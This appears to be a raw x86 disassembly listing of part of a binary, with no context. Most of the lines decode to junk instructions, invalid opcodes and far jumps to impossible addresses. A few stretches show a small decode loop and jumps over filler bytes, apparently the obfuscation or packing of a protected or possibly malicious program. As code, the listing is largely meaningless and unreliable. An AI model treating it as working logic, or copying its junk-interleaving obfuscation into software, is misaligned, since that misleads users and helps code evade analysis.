  4071ed:	std    
  4071ee:	dec    ebp
  4071ef:	add    BYTE PTR [esi-0x4b280ad4],ch
  4071f5:	xor    ecx,edi
  4071f7:	shl    bh,cl
  4071f9:	add    DWORD PTR [ebp+0x78eaa4e3],esp
  4071ff:	add    al,0x7e
  407201:	call   0x6dcb:0xd8668ce4
  407208:	in     al,dx
  407209:	test   BYTE PTR [eax-0x1f],dl
  40720c:	xchg   esi,eax
  40720d:	in     eax,dx
  40720e:	mov    ecx,0x646e1ccd
  407213:	fcomp  DWORD PTR [edx+0x5]
  407216:	and    al,bh
  407218:	aad    0xcf
  40721a:	sub    BYTE PTR [edx+ebp*4+0x1c],0x58
  40721f:	mov    esp,0x8d679e31
  407224:	jmp    0x6ce96f1b
  407229:	push   edi
  40722a:	(bad)  [edi]
  40722c:	(bad)  
  40722e:	fcmovu st,st(0)
  407230:	dec    edi
  407231:	dec    edx
  407232:	inc    ebp
  407233:	cmp    eax,0x5bbb2bc
  407238:	dec    esp
  407239:	mov    eax,0x58b2f346
  40723e:	leave  
  40723f:	push   esi
  407240:	inc    edx
  407241:	outs   dx,BYTE PTR ds:[esi]
  407242:	lds    ebp,FWORD PTR [ebp-0x57b78428]
  407248:	jne    0x407207
  40724a:	and    DWORD PTR [ebp+0x24],ecx
  40724d:	jbe    0x407262
  40724f:	loop   0x407206
  407251:	cwde   
  407252:	dec    esp
  407253:	add    ebx,ecx
  407255:	shr    BYTE PTR [edx+0x26],cl
  407258:	stc    
  407259:	jae    0x50811b84
  40725f:	rcl    DWORD PTR [edx+esi*2+0x66],0x61
  407264:	adc    eax,0x255a0c56
  407269:	and    cl,0xc9
  40726c:	test   eax,0x8e746ac1
  407271:	sub    BYTE PTR [edi-0x456c054a],dl
  407277:	(bad)  
  407278:	into   
  407279:	pop    ecx
  40727a:	cmp    eax,DWORD PTR [edi]
  40727c:	fbld   TBYTE PTR [ecx]
  40727e:	adc    DWORD PTR [ebp+0xe],edx
  407281:	std    
  407282:	pop    edi
  407283:	sar    bh,0x70
  407286:	xor    al,0xce
  407288:	xchg   esp,eax
  407289:	pop    ss
  40728a:	lods   eax,DWORD PTR ds:[esi]
  40728b:	and    DWORD PTR [edi+0x56],ebx
  40728e:	cdq    
  40728f:	sub    al,0xc0
  407291:	jo     0x407218
  407293:	hlt    
  407294:	add    bh,ch
  407296:	dec    edx
  407297:	inc    eax
  407298:	cld    
  407299:	retf   0xbf73
  40729c:	icebp  
  40729d:	fistp  WORD PTR [eax+eiz*2]
  4072a0:	jmp    0x7208:0xe0c11138
  4072a7:	aaa    
  4072a8:	sbb    DWORD PTR [ebp-0x68],ecx
  4072ab:	bound  ebx,QWORD PTR ds:0x90be5fb0
  4072b1:	pushf  
  4072b2:	xchg   esi,eax
  4072b3:	push   cs
  4072b4:	or     al,0x65
  4072b6:	aam    0xcf
  4072b8:	push   ds
  4072b9:	mov    esp,0xd432c251
  4072be:	std    
  4072bf:	jno    0x407260
  4072c1:	xchg   ecx,eax
  4072c2:	fcmovnb st,st(5)
  4072c4:	enter  0xb9b4,0x44
  4072c8:	call   0x6f0d:0xa98cde82
  4072cf:	push   0x30
  4072d1:	xchg   esp,eax
  4072d2:	cmp    eax,0x9f8e426
  4072d7:	lds    eax,FWORD PTR [eax+ecx*1]
  4072da:	xchg   ebx,eax
  4072db:	mov    BYTE PTR [edx-0x421433b2],cl
  4072e1:	jmp    0x1c40:0x8a613966
  4072e8:	xchg   edi,eax
  4072e9:	cmp    eax,DWORD PTR [eax-0x2f]
  4072ec:	add    eax,0x1121f7f0
  4072f1:	pop    ecx
  4072f2:	data16 (bad) 
  4072f4:	and    BYTE PTR [esi-0x42e5f6c],bl
  4072fa:	call   0x31adfb34
  4072ff:	sub    DWORD PTR [ebx],esi
  407301:	and    al,0xe5
  407303:	hlt    
  407304:	inc    ebx
  407305:	aaa    
  407306:	and    al,0x7a
  407308:	push   ebx
  407309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40730a:	push   ebx
  40730b:	ja     0x407342
  40730d:	xor    dl,bh
  40730f:	add    ecx,DWORD PTR [ecx+0x3db38795]
  407315:	mov    eax,DWORD PTR [ebp-0x8]
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x430546
  40732a:	sub    DWORD PTR ds:0x43049a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e762,0x4304aa
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x4304b6,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi+0x6602235c]
  40736c:	jl     0x40730d
  40736e:	outs   dx,DWORD PTR ds:[esi]
  40736f:	or     edi,ecx
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x4073b5
  407378:	cmp    cl,BYTE PTR [ebx-0x6e2c4ba2]
  40737e:	stos   BYTE PTR es:[edi],al
  40737f:	shr    dh,cl
  407381:	loope  0x407399
  407383:	mov    eax,edi
  407385:	mov    edx,0xa2631d1f
  40738a:	xchg   esi,eax
  40738b:	xor    DWORD PTR [eax-0x1d39ae17],ebp
  407391:	je     0x40739d
  407393:	in     al,0x56
  407395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407396:	aas    
  407397:	jl     0x40735a
  407399:	dec    esp
  40739a:	fnstcw WORD PTR [ebx+0x1e]
  40739d:	xchg   esp,eax
  40739e:	add    eax,eax
  4073a0:	xchg   edi,eax
  4073a1:	mov    WORD PTR [ecx],ds
  4073a3:	adc    esi,edx
  4073a5:	bound  eax,QWORD PTR [ebp+ecx*8-0xe5e836a]
  4073ac:	pop    eax
  4073ad:	mov    esp,0xff15aa42
  4073b2:	call   0x7a0c:0xfc559ee2
  4073b9:	sub    bl,BYTE PTR [ebx]
  4073bb:	enter  0x3024,0xbb
  4073bf:	in     eax,0xab
  4073c1:	ins    DWORD PTR es:[edi],dx
  4073c2:	push   esp
  4073c3:	mov    edx,0xcec4d105
  4073c8:	addr16 neg esi
  4073cb:	mov    ds:0x2d2e43ef,eax
  4073d0:	mov    ebp,0x8b03b895
  4073d5:	adc    eax,0x5936125c
  4073da:	retf   
  4073db:	cmp    cl,BYTE PTR es:[edx]
  4073de:	lock pop ds
  4073e0:	std    
  4073e1:	jg     0x407400
  4073e3:	or     BYTE PTR [ebx*1+0x6e323fd9],0x94
  4073eb:	mov    ch,0xf2
  4073ed:	sbb    ebx,DWORD PTR [ebp-0x3d]
  4073f0:	xchg   esi,eax
  4073f1:	and    al,0x90
  4073f3:	sti    
  4073f4:	rol    DWORD PTR [ecx+esi*8],1
  4073f7:	adc    eax,edx
  4073f9:	ret    0xb461
  4073fc:	xor    al,bh
  4073fe:	cld    
  4073ff:	into   
  407400:	mov    al,0x27
  407402:	xchg   BYTE PTR [eax],dl
  407404:	hlt    
  407405:	inc    edi
  407406:	or     al,0xdb
  407408:	jbe    0x407464
  40740a:	pop    esi
  40740b:	div    DWORD PTR [ebx+0x33]
  40740e:	pop    edx
  40740f:	cmp    DWORD PTR [ecx+0x31df5b52],ebx
  407415:	inc    ebx
  407416:	mov    ebp,0x9b2da287
  40741b:	cli    
  40741c:	push   ss
  40741d:	pop    ss
  40741e:	inc    eax
  40741f:	jle    0x4073f2
  407421:	cmp    eax,0x15752247
  407426:	inc    ebx
  407427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407428:	xchg   ebx,eax
  407429:	sbb    ebx,DWORD PTR [esi+0x43]
  40742c:	sub    eax,0x476427b4
  407431:	mov    al,BYTE PTR [ebp+0x41]
  407434:	sar    DWORD PTR [edx-0x35],0xfb
  407438:	aas    
  407439:	cs xchg edi,eax
  40743b:	(bad)  
  40743c:	dec    ecx
  40743d:	cmp    eax,DWORD PTR ds:0x919e7a27
  407443:	stc    
  407444:	aad    0x25
  407446:	xlat   BYTE PTR ds:[ebx]
  407447:	and    DWORD PTR [eax+0x40],esp
  40744a:	mov    bl,0xc1
  40744c:	js     0x40748c
  40744e:	mov    ah,0xee
  407450:	add    ch,dl
  407452:	leave  
  407453:	popf   
  407454:	sbb    BYTE PTR [esi+0x67],0x5a
  407458:	in     eax,dx
  407459:	pop    esp
  40745a:	call   0x8755:0x1c7dc64
  407461:	lods   al,BYTE PTR ds:[esi]
  407462:	jo     0x40747f
  407464:	stos   BYTE PTR es:[edi],al
  407465:	icebp  
  407466:	and    al,ah
  407468:	mov    ch,0x43
  40746a:	fcmovne st,st(1)
  40746c:	pop    esi
  40746d:	rol    DWORD PTR [ecx+0x68e1ce01],1
  407473:	(bad)  
  407475:	mov    esi,0x25365e3e
  40747a:	mov    ah,0x7f
  40747c:	mov    bh,0xac
  40747e:	mov    esp,0x6c52a252
  407483:	daa    
  407484:	dec    ebx
  407485:	pushf  
  407486:	aam    0x22
  407488:	jnp    0x4074f4
  40748a:	jp     0x4074f5
  40748c:	aad    0x66
  40748e:	pop    eax
  40748f:	mov    ch,0xe2
  407491:	je     0x40744b
  407493:	ja     0x407463
  407495:	daa    
  407496:	ror    BYTE PTR [edi],cl
  407498:	dec    ebx
  407499:	pop    ds
  40749a:	cmp    ah,dh
  40749c:	adc    BYTE PTR [esi+0x5b5d201b],0x55
  4074a3:	mov    dl,0x48
  4074a5:	mov    bl,0x4b
  4074a7:	inc    ecx
  4074a8:	mov    ecx,0xdfed1fc3
  4074ad:	aam    0xf3
  4074af:	cwde   
  4074b0:	mov    ecx,0x818245cb
  4074b5:	icebp  
  4074b6:	and    eax,0x5ed065a0
  4074bb:	cmp    al,BYTE PTR [eax+0xf]
  4074be:	xchg   edx,eax
  4074bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074c0:	mov    ds:0xfc8dbba0,eax
  4074c5:	adc    esp,DWORD PTR [edi+ebp*8]
  4074c8:	mov    eax,cs:0x31868bb
  4074ce:	push   0xa1842601
  4074d3:	outs   dx,BYTE PTR ds:[esi]
  4074d4:	fdiv   QWORD PTR [ecx+0x75]
  4074d7:	dec    ebp
  4074d8:	dec    ecx
  4074d9:	loop   0x4074d4
  4074db:	cmp    eax,0x40
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	jmp    0x4074be
  40750b:	loop   0x4074c8
  40750d:	in     eax,dx
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x407500
  407516:	std    
  407517:	or     DWORD PTR [ebx-0x72],ebp
  40751a:	jae    0x407585
  40751c:	cmp    DWORD PTR [ecx+0x43cf10ed],eax
  407522:	jmp    0x7c9b8da2
  407527:	cwde   
  407528:	iret   
  407529:	pop    esi
  40752a:	sub    DWORD PTR [ebp+eax*2+0x6c1f50ad],0xb6ae5a64
  407535:	int    0x5e
  407537:	clc    
  407538:	dec    ebp
  407539:	daa    
  40753a:	push   eax
  40753b:	xchg   esi,eax
  40753c:	jg     0x4074eb
  40753e:	mov    edx,0x3acf108f
  407543:	mov    eax,0x151b6a11
  407548:	mov    esp,0x539fc55a
  40754d:	pop    es
  40754e:	jno    0x407594
  407550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407552:	jecxz  0x4075c4
  407554:	mov    bh,0x44
  407556:	cmp    DWORD PTR [ebp*2+0x349e6663],edx
  40755d:	addps  xmm0,xmm4
  407560:	imul   DWORD PTR [edi+0x19]
  407563:	jbe    0x407502
  407565:	mov    cl,0x39
  407567:	hlt    
  407568:	and    DWORD PTR [eax+0x7f73444e],eax
  40756e:	fbstp  TBYTE PTR [edx+0x34ef3754]
  407574:	dec    ebx
  407575:	test   al,0x31
  407577:	pop    ebp
  407578:	mov    ds:0x56c43621,al
  40757d:	sub    DWORD PTR [edx],esp
  40757f:	inc    ebp
  407580:	sbb    eax,DWORD PTR [edi-0x103a0ee4]
  407586:	pop    ss
  407587:	push   ebp
  407588:	push   ebx
  40758a:	sub    DWORD PTR [edi],esi
  40758c:	repz cwde 
  40758e:	ins    DWORD PTR es:[edi],dx
  40758f:	or     al,BYTE PTR [ebx]
  407591:	xchg   ecx,eax
  407592:	push   0x3f
  407594:	mov    ebx,0x446cd97f
  407599:	clc    
  40759a:	clc    
  40759b:	fld    QWORD PTR [ebx+0x6ec728b4]
  4075a1:	mov    bh,0x69
  4075a3:	sub    cl,bl
  4075a5:	mov    bl,0xd2
  4075a7:	adc    DWORD PTR [ebp-0x1c],esp
  4075aa:	xchg   esp,eax
  4075ab:	aaa    
  4075ac:	stos   BYTE PTR es:[edi],al
  4075ad:	inc    edx
  4075ae:	push   ss
  4075af:	dec    esp
  4075b0:	sub    DWORD PTR [edx-0x10],edi
  4075b3:	fnstenv [esi-0xb]
  4075b6:	fbstp  TBYTE PTR [ebp-0x3e]
  4075b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075ba:	xor    bl,BYTE PTR [eax]
  4075bc:	sbb    eax,0xfbe9bcfd
  4075c1:	or     eax,0x291ba3db
  4075c6:	mov    ah,0xb8
  4075c8:	xchg   ebx,eax
  4075c9:	push   edx
  4075ca:	enter  0x8659,0x2f
  4075ce:	imul   ebx,DWORD PTR [edx-0x44fc0180],0xa90570e6
  4075d8:	sbb    DWORD PTR [ebx],ebp
  4075da:	push   ebx
  4075db:	push   edx
  4075dc:	jns    0x4075cd
  4075de:	bound  esi,QWORD PTR [esi]
  4075e0:	pextrw edi,mm5,0xe4
  4075e4:	(bad)  
  4075e5:	fild   QWORD PTR [ecx]
  4075e7:	mov    cl,0x3c
  4075e9:	pop    esp
  4075ea:	pop    ebx
  4075eb:	int3   
  4075ec:	dec    ecx
  4075ed:	cdq    
  4075ee:	mov    cl,BYTE PTR [edi]
  4075f0:	hlt    
  4075f1:	ds inc eax
  4075f3:	addr16 (bad) 
  4075f5:	js     0x407606
  4075f7:	scas   al,BYTE PTR es:[edi]
  4075f8:	fistp  QWORD PTR [eax]
  4075fa:	ins    BYTE PTR es:[edi],dx
  4075fb:	call   FWORD PTR [ebx+0x1e]
  4075fe:	cli    
  4075ff:	cli    
  407600:	retf   0x9807
  407603:	fwait
  407604:	inc    esi
  407605:	(bad)  
  407606:	xlat   BYTE PTR ds:[ebx]
  407607:	aaa    
  407608:	mov    ebp,0xda50a84d
  40760d:	test   eax,0xb2e64d83
  407612:	jae    0x40766f
  407614:	in     eax,dx
  407615:	mov    eax,ds:0x3a62df92
  40761a:	sbb    eax,0x9ccc727
  40761f:	adc    eax,0x747a2f6c
  407624:	jp     0x4075dc
  407626:	sub    DWORD PTR [ecx],eax
  407628:	dec    ebp
  407629:	dec    eax
  40762a:	popf   
  40762b:	gs xchg edx,eax
  40762d:	xchg   ebx,eax
  40762e:	cwde   
  40762f:	push   ds
  407630:	or     eax,DWORD PTR [esi+0x22]
  407633:	add    al,0x61
  407635:	or     ecx,edx
  407637:	inc    esi
  407638:	(bad)  
  407639:	aam    0xfa
  40763b:	(bad)  
  40763c:	cwde   
  40763d:	aas    
  40763e:	in     eax,0xcd
  407640:	addr16 leave 
  407642:	xor    DWORD PTR ds:0x97e8aef0,esi
  407648:	das    
  407649:	test   DWORD PTR ds:0xdae107d0,edx
  40764f:	mov    BYTE PTR [ecx-0x5f],dl
  407652:	jno    0x40763a
  407654:	test   BYTE PTR [ebp-0x2c],dl
  407657:	cmp    al,BYTE PTR [ebp+0x3e3a6a15]
  40765d:	lds    ecx,FWORD PTR [edx+eax*4+0x56]
  407661:	inc    edx
  407662:	inc    edi
  407663:	xchg   ebx,eax
  407664:	and    DWORD PTR [edx-0x57c4a1a6],esp
  40766a:	ds xchg esi,eax
  40766c:	cmc    
  40766d:	adc    al,0x3b
  40766f:	arpl   dx,si
  407671:	out    0x95,eax
  407673:	rcl    dh,cl
  407675:	and    al,0xfe
  407677:	jg     0x4076af
  407679:	mov    edi,DWORD PTR [ebp+0x8]
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	adc    ch,BYTE PTR [ebp-0x5e]
  407690:	test   DWORD PTR [ecx-0x3f],eax
  407693:	jle    0x407713
  407695:	sar    BYTE PTR [edi+0x7e],cl
  407698:	jle    0x40762e
  40769a:	add    DWORD PTR [eax],0xfffffffd
  40769d:	ins    DWORD PTR es:[edi],dx
  40769e:	pop    es
  40769f:	pop    edx
  4076a0:	ficomp DWORD PTR [edx-0x36]
  4076a3:	inc    ebp
  4076a4:	pop    esp
  4076a5:	lock or cl,BYTE PTR [esi]
  4076a8:	call   FWORD PTR [edx]
  4076aa:	int    0x2e
  4076ac:	add    di,bx
  4076af:	jge    0x40764f
  4076b1:	int    0x9c
  4076b3:	dec    eax
  4076b4:	mov    bh,0x19
  4076b6:	shl    BYTE PTR cs:[edi-0xa0269b9],1
  4076bd:	iret   
  4076be:	js     0x4076aa
  4076c0:	xor    BYTE PTR [esi+0x5a838e1d],ch
  4076c6:	mov    BYTE PTR [ebp+0x8e36a5e],ah
  4076cc:	add    ecx,DWORD PTR [ebx+0x31]
  4076cf:	fiadd  DWORD PTR [edx-0x7f]
  4076d2:	jns    0x407655
  4076d4:	(bad)  
  4076d5:	cli    
  4076d6:	push   esi
  4076d7:	adc    BYTE PTR [ecx+0x48],ch
  4076da:	jb     0x40767a
  4076dc:	push   ebp
  4076dd:	mov    al,0x4d
  4076df:	xchg   edi,eax
  4076e0:	loop   0x407751
  4076e2:	data16 jp 0x407754
  4076e5:	dec    ebp
  4076e6:	rcr    dh,cl
  4076e8:	mov    ah,0x8d
  4076ea:	xor    eax,0xf28f0325
  4076ef:	fisub  WORD PTR [ecx+0x74a0a7a9]
  4076f5:	add    BYTE PTR [edi+0xb3d7db9],dh
  4076fb:	test   al,0xd5
  4076fd:	mov    esp,0xffd2116c
  407702:	push   ebp
  407703:	xor    cl,BYTE PTR [ecx-0x51]
  407706:	xor    edi,DWORD PTR [esi-0x4b]
  407709:	nop
  40770a:	sbb    al,0x83
  40770c:	stos   BYTE PTR es:[edi],al
  40770d:	cli    
  40770e:	out    dx,eax
  40770f:	and    esp,DWORD PTR [edi-0x4e]
  407712:	jb     0x40775d
  407714:	in     al,0x96
  407716:	daa    
  407717:	pushf  
  407718:	xchg   esi,eax
  407719:	retf   0x97ce
  40771c:	jl     0x407706
  40771e:	cs or  edx,esi
  407721:	ins    DWORD PTR es:[edi],dx
  407722:	mov    dh,0x66
  407724:	ret    0x928c
  407727:	push   esi
  407728:	fidivr DWORD PTR [ebx]
  40772a:	mov    ebx,es
  40772c:	sti    
  40772d:	xor    DWORD PTR [ecx+0x20],0x3
  407731:	ins    DWORD PTR es:[edi],dx
  407732:	mov    WORD PTR [ebp-0x25],es
  407735:	ds popa 
  407737:	dec    eax
  407738:	xchg   ebx,eax
  407739:	sahf   
  40773a:	das    
  40773b:	daa    
  40773c:	lock dec eax
  40773e:	xor    BYTE PTR [esi+edx*2-0x3c9e7ae1],0x70
  407746:	popf   
  407747:	sub    eax,0xf8e551a7
  40774c:	es add ebp,ecx
  40774f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407750:	(bad)  
  407752:	call   FWORD PTR [ebx+0x71]
  407755:	dec    esp
  407756:	and    al,0x5f
  407758:	(bad)  
  407759:	and    eax,0xb0a45763
  40775e:	and    dh,BYTE PTR [esi+0x7c90de76]
  407764:	repnz cld 
  407766:	push   esp
  407767:	je     0x4077c2
  407769:	dec    esp
  40776a:	pop    DWORD PTR [esi]
  40776c:	(bad)  
  40776d:	call   0xd6a42e9b
  407772:	lds    edx,FWORD PTR [eax]
  407774:	push   0x19a07441
  407779:	pop    ebx
  40777a:	adc    dh,BYTE PTR [ebx]
  40777c:	fwait
  40777d:	sub    eax,0x40ba5f83
  407782:	pop    ebp
  407783:	stos   BYTE PTR es:[edi],al
  407784:	cli    
  407785:	mov    ecx,0x63f58d6e
  40778a:	dec    esi
  40778b:	push   edx
  40778c:	inc    ebx
  40778e:	cmp    ecx,0x2e
  407791:	(bad)  
  407792:	ds nop
  407794:	xor    edx,DWORD PTR [ecx-0xf]
  407797:	in     al,0x96
  407799:	push   0xdeb02b7f
  40779e:	jne    0x4077a5
  4077a0:	out    dx,al
  4077a1:	nop
  4077a2:	ins    BYTE PTR es:[edi],dx
  4077a3:	std    
  4077a4:	into   
  4077a5:	mov    dl,BYTE PTR es:[eax]
  4077a8:	jae    0x407742
  4077aa:	xchg   edi,eax
  4077ab:	loop   0x4077d6
  4077ad:	pop    esi
  4077ae:	in     al,0x47
  4077b0:	push   edi
  4077b1:	sti    
  4077b2:	fistp  QWORD PTR [eax+0x4ecbea43]
  4077b8:	in     eax,dx
  4077b9:	loopne 0x4077e4
  4077bb:	out    dx,eax
  4077bc:	nop    edx
  4077bf:	stc    
  4077c0:	test   eax,0xad8579ed
  4077c5:	fdivr  QWORD PTR [edx]
  4077c7:	fisubr WORD PTR [edi-0x4]
  4077ca:	xchg   edx,eax
  4077cb:	das    
  4077cc:	int    0x90
  4077ce:	xlat   BYTE PTR ds:[ebx]
  4077cf:	mov    dh,0xb5
  4077d1:	test   DWORD PTR [ecx],edi
  4077d3:	xlat   BYTE PTR ds:[ebx]
  4077d4:	jmp    0x4077ed
  4077d6:	adc    DWORD PTR [ecx+0x8],esp
  4077d9:	sub    al,0xb
  4077db:	lock jns 0x4077af
  4077de:	hlt    
  4077df:	mov    esi,0x5297008b
  4077e4:	leave  
  4077e5:	outs   dx,BYTE PTR ds:[esi]
  4077e6:	pop    eax
  4077e7:	jo     0x407854
  4077e9:	mov    ds:0x3415dd7a,al
  4077ee:	pushf  
  4077ef:	adc    ch,BYTE PTR [ecx]
  4077f1:	leave  
  4077f2:	xchg   ebp,eax
  4077f3:	ja     0x4077d8
  4077f5:	mov    cl,0x5b
  4077f7:	js     0x407789
  4077f9:	mov    ebp,0xb8271c40
  4077fe:	inc    eax
  4077ff:	mov    al,BYTE PTR [eax]
  407801:	add    BYTE PTR [esi+0x33],ah
  407804:	inc    esp
  407805:	xchg   edi,eax
  407806:	add    bh,BYTE PTR [edi+0x3b06]
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	push   es
  407821:	inc    ecx
  407822:	or     ch,BYTE PTR [ebp+0x7e7ec325]
  407828:	sar    BYTE PTR [edi+0x7e],cl
  40782b:	jle    0x40789c
  40782d:	(bad)  
  40782e:	fisub  DWORD PTR [edx-0x67572f49]
  407834:	mov    dh,0xb5
  407836:	or     cl,dl
  407838:	mov    eax,0xb95c1996
  40783d:	mov    al,ds:0x5067f6dd
  407842:	adc    DWORD PTR [ecx-0x2652c789],0xd80a7547
  40784c:	sbb    al,0x63
  40784e:	add    cl,BYTE PTR [esi+0x7eb3815f]
  407854:	sbb    eax,esp
  407856:	adc    dh,BYTE PTR [edi-0xad3217]
  40785c:	push   0xffffffe9
  40785e:	mov    bl,0xe3
  407860:	sar    edi,cl
  407862:	add    dh,0x1c
  407865:	push   cs
  407866:	or     ah,BYTE PTR [ecx]
  407868:	sub    bh,dl
  40786a:	ins    BYTE PTR es:[edi],dx
  40786b:	jecxz  0x407822
  40786d:	mov    ds:0xd11d89cf,eax
  407872:	nop    esp
  407875:	test   eax,0x1b3bc724
  40787a:	or     ebp,ebx
  40787c:	ret    0x54c
  40787f:	pop    ebx
  407880:	or     BYTE PTR [edx+0x68],bl
  407883:	xchg   ebp,eax
  407884:	pop    ebx
  407885:	lods   al,BYTE PTR ds:[esi]
  407886:	pop    ebx
  407887:	cmp    al,bl
  407889:	cmp    eax,DWORD PTR [eax+0x55]
  40788c:	sbb    edi,DWORD PTR [esi+ebp*4]
  40788f:	jl     0x407860
  407891:	les    eax,FWORD PTR [edi]
  407893:	lods   al,BYTE PTR ds:[esi]
  407894:	mov    ebp,edi
  407896:	fwait
  407897:	out    dx,eax
  407898:	xchg   edi,eax
  407899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40789a:	div    cl
  40789c:	mov    bl,0x21
  40789e:	push   esp
  40789f:	leave  
  4078a0:	sbb    ch,0x87
  4078a3:	das    
  4078a4:	scas   al,BYTE PTR es:[edi]
  4078a5:	mov    edi,0x8da903ed
  4078aa:	fistp  QWORD PTR [esi+0x6a9799c5]
  4078b0:	out    0x4e,al
  4078b2:	jmp    0x9f96c3d3
  4078b7:	add    eax,0x73a79e37
  4078bc:	mov    edi,0xe6fae495
  4078c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c2:	ret    0x15a9
  4078c5:	and    BYTE PTR [eax],bl
  4078c7:	iretw  
  4078c9:	xchg   esi,eax
  4078ca:	pop    ebx
  4078cb:	lds    ebp,FWORD PTR [ecx-0x55]
  4078ce:	dec    ebp
  4078cf:	out    0x63,al
  4078d1:	fbld   TBYTE PTR [eax+0x22379aa1]
  4078d7:	sub    DWORD PTR [eax],esi
  4078d9:	add    al,al
  4078db:	pushf  
  4078dc:	push   ss
  4078dd:	mov    ebp,0x322dcfe0
  4078e2:	or     DWORD PTR [eax+0x4bdca7ac],esi
  4078e8:	pop    ebx
  4078e9:	test   BYTE PTR [eax+0x50],ch
  4078ec:	mov    ebp,0x9d2d6509
  4078f1:	ins    DWORD PTR es:[edi],dx
  4078f2:	mov    WORD PTR [ebx],ds
  4078f4:	popf   
  4078f5:	adc    dl,bh
  4078f7:	std    
  4078f8:	sub    eax,0x9bcd183a
  4078fd:	retf   
  4078fe:	xchg   ebp,eax
  4078ff:	mov    WORD PTR [ebp-0x5eb65790],ds
  407905:	mov    dh,0x41
  407907:	sub    ch,al
  407909:	jno    0x40789c
  40790b:	add    ebp,DWORD PTR [edi+0x75]
  40790e:	mov    ch,0xc8
  407910:	jp     0x407957
  407912:	cs or  al,0x9e
  407915:	lods   al,BYTE PTR ds:[esi]
  407916:	add    esp,0xe5e65cf1
  40791c:	ja     0x40791f
  40791e:	das    
  40791f:	or     dl,BYTE PTR [edx+0xc]
  407922:	and    DWORD PTR [esi],ebp
  407924:	or     BYTE PTR [ebx-0x40],ch
  407927:	jp     0x40793a
  407929:	sub    DWORD PTR [edx+0x38aa5f35],esi
  40792f:	xchg   esp,eax
  407930:	loope  0x407999
  407932:	ins    DWORD PTR es:[edi],dx
  407933:	punpckhwd mm4,QWORD PTR [ecx+0x63b5949c]
  40793a:	inc    ecx
  40793b:	(bad)  
  40793c:	fadd   DWORD PTR [esi+0x444ab724]
  407942:	(bad)  
  407944:	lods   eax,DWORD PTR ds:[esi]
  407945:	call   0xd718:0xc277288d
  40794c:	or     BYTE PTR [edi+0x512cb6e4],0x9f
  407953:	or     DWORD PTR [ebx+0x60],esp
  407956:	sub    edi,DWORD PTR [ebx+edi*2-0x825f8f9]
  40795d:	inc    esp
  40795e:	into   
  40795f:	enter  0x1e3d,0x1f
  407963:	dec    edi
  407964:	xor    ebp,eax
  407966:	mov    bh,dh
  407968:	mov    al,ds:0x40a0955f
  40796d:	jnp    0x407980
  40796f:	pop    esp
  407970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407971:	inc    ecx
  407972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407973:	inc    DWORD PTR [esi-0x2b779979]
  407979:	jae    0x407988
  40797b:	jge    0x4079c0
  40797d:	sbb    eax,0x327ccfd6
  407982:	add    ecx,DWORD PTR [ebx+0x4400bed6]
  407988:	add    DWORD PTR [edx-0x65a65f9b],ecx
  40798e:	std    
  40798f:	xor    al,0xf
  407991:	mov    bh,0xc0
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	aam    0xea
  4079a9:	xor    DWORD PTR [ecx+ebx*4],0xd27e7ec4
  4079b0:	jg     0x407a30
  4079b2:	jle    0x407a12
  4079b4:	daa    
  4079b5:	cld    
  4079b6:	inc    ebp
  4079b7:	dec    esi
  4079b8:	outs   dx,BYTE PTR ds:[esi]
  4079b9:	lods   al,BYTE PTR ds:[esi]
  4079ba:	sbb    eax,0x775b08ae
  4079bf:	aam    0x2c
  4079c1:	bound  ebx,QWORD PTR [ecx+0x63]
  4079c4:	adc    ah,bl
  4079c6:	jnp    0x407a28
  4079c8:	cli    
  4079c9:	cld    
  4079ca:	clc    
  4079cb:	(bad)  
  4079cc:	jle    0x407a48
  4079ce:	cmp    BYTE PTR [edx-0x63400084],dl
  4079d4:	jle    0x4079a6
  4079d6:	retf   
